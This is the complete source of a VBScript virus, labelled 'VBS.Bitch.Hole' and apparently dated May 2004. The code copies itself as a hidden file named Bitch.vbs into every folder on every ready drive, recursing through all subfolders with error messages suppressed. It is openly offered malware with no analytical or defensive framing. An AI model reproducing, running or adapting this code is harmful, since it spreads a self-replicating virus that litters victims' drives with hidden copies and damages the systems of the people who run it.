'<><><><><><><><><><><><><><>
'VBS.Bitch.Hole         <><><><>
'Spidey @ Mei 2004         <><><><>
'<><><><><><><><><><><><><><><><><><><>
Randomize :
On Error Resume Next
Set Fso = CreateObject("Scripting.FileSystemObject")
Set cOde = Fso.OpenTextFile(WScript.ScriptFullName,1)
VBScript = cOde.ReadAll
cOde.Close

Set Drives = Fso.Drives
For Each Drive in Drives
If Drive.isReady then
Srch Drive & "\"
End If
Next

Sub Srch(HoLe)
On Error Resume Next
If (Bitch <> HoLe) then
Set Text = Fso.CreateTextFile(HoLe & "\Bitch.vbs")
Text.Write VBScript
Text.Close
Bitch = HoLe
Set Att = Fso.GetFile(HoLe & "\Bitch.vbs")
Att.Attributes = Att.Attributes + 2
End If
For Each Folder in Fso.GetFolder(HoLe).SubFolders
Srch(Folder.Path)
Next
End Sub